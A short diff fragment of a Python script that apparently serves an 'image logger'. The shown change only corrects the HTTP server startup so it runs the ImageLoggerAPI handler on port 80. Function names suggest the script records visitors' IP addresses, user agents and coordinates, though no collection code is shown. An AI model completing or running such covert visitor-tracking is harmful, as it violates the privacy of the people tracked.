@@ -234,5 +234,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 
 if __name__ == "__main__":
-    from http.server import HTTPServer
-    server = HTTPServer(('', 80), Image
+    from http.server import HTTPServer  # Make sure this import is present
+    server = HTTPServer(('', 80), ImageLoggerAPI)  # Corrected line
+    print(f"{__app__} {__version__} by {__author__} started on port 80")
+    server.serve_forever()
